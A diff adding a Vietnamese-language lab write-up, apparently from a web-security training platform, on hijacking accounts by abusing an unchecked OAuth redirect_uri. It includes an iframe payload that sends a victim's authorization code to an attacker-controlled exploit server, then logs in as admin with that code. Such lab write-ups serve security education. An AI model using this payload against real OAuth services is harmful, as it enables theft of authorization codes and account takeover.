@@ -87,5 +87,48 @@ Thực hiện kịch bản tấn công bằng cách sau:
 
 <img width="619" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/25aa6234-25b6-4ce4-ba37-ffaefcc3edce">
 
+***
+## 3. Lab: OAuth account hijacking via redirect_uri
+
+* Content:
+```
+This lab uses an OAuth service to allow users to log in with their social media account. A misconfiguration by the OAuth provider makes it possible for an attacker to steal authorization codes associated with other users' accounts.
+
+To solve the lab, steal an authorization code associated with the admin user, then use it to access their account and delete the user carlos.
+
+The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.
+
+You can log in with your own social media account using the following credentials: wiener:peter.
+```
+* Exploit:
+
+Theo dõi hành vi thực hiện thao tác login hệ thống:
+- Lần đăng nhập đầu tiên, hệ thống redirect ta đến trang đăng nhập bằng tài khoản Social Media
+- Thực hiện logout, từ lần đăng nhập thứ 2 thì hệ thống tự động login chúng ta vào bằng tài khoản đã đăng nhập trước đó (Ko bắt nhập lại username/password nữa)
+
+Ngoài ra theo dõi trên BurpSuite ta thấy:
+- Ngay sau 1 request `/auth?client_id=...` sẽ là request đến `/oauth-callback?code=...`
+<img width="394" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/9fd4251f-9014-4f85-807d-c7cef8f53eea">
+
+- Khi thực hiện request đến `/auth?client_id=...` thì giá trị của tham số `redirect_uri` sẽ là địa chỉ link chuyển hướng trình duyệt của người dùng đến ở request sau đó.
+<img width="463" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/84d85187-63c1-4d01-b36a-6135afe191ec">
+- Request này không chịu bất kỳ một sự kiểm soát/kiểm tra nào, thực hiện gửi một vài Craft Request qua Repeater BurpSuite thì thấy đều thực hiện chuyển hướng người dùng sang link chỉ định trong `redirect_uri` kèm theo giá trị `code`.
+
+<img width="493" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/5062ad0d-6ba7-4b95-9d3d-62e68944ed43">
+
+- Như vậy đặt giả thuyết là nếu ta truyền giá trị `redirect_uri` là một địa chỉ mà hacker kiểm soát thì hacker sẽ nhận được giá trị code này. Vậy nếu người dùng admin truy cập vào link `/auth?client_id=...` với `redirect_uri` là địa chỉ của hacker kiểm soát thì `code` của Admin sẽ bị Hacker chiếm được.
+
+- Lab cho ta một Exploit Server để deliver link độc hại đến victim => Ta thực hiện gửi 1 link /exploit đến victim có nội dung như sau:
+
+`<iframe src="https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>`
+
+- Deliver to victim => Check log access trên Exploit server ta thấy đã nhận được giá trị code của victim:
+
+<img width="634" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/995dca1e-d758-44ac-aeee-2341d9151ec5">
+
+- Dùng code trên truy cập vào link `/oauth-callback?code=...` trên trình duyệt, xác nhận đã login được vào hệ thống bằng user Admin.
+- Thực hiện xóa user Carlos => LAB Solved!
+<img width="606" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/651a0dc9-751a-4a4e-b98a-1af2a37220d9">
+
 
 
